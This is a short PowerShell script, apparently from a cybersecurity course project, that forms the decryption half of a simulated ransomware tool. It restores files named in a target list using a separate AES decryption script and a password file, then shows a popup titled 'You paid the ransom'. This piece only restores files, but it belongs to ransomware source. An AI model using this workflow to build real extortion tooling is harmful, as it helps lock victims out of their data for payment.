#main executable file for decryption

$FilesToEncrypt = "C:\Users\Jonathan\CSEC-604-Project-Repo\EncryptionTargets.txt"
$DecScript = "C:\Users\Jonathan\CSEC-604-Project-Repo\Unprotect-AesFile.ps1"
$Storage = "C:\Users\Jonathan\CSEC-604-Project-Repo\encrypted-text-storage.txt"

Get-Content $FilesToEncrypt | Where-Object {$_.Trim() -ne ""} | ForEach-Object{
	$FilePath = $_.Trim()

	if (Test-Path $FilePath) {
		
		Write-Host "Decrypting file: $FilePath"
		& $DecScript -InFile $FilePath -OutFile $Storage -PasswordFile Password.txt
		[IO.File]::WriteAllBytes($FilePath, [IO.File]::ReadAllBytes($Storage))
	}
	else{
		Write-Warning "File not found: $FilePath"
	}

}
$wshell = New-Object -ComObject Wscript.Shell
$result = $wshell.popup("Your files are back to normal", 0, "You paid the ransom", 0)
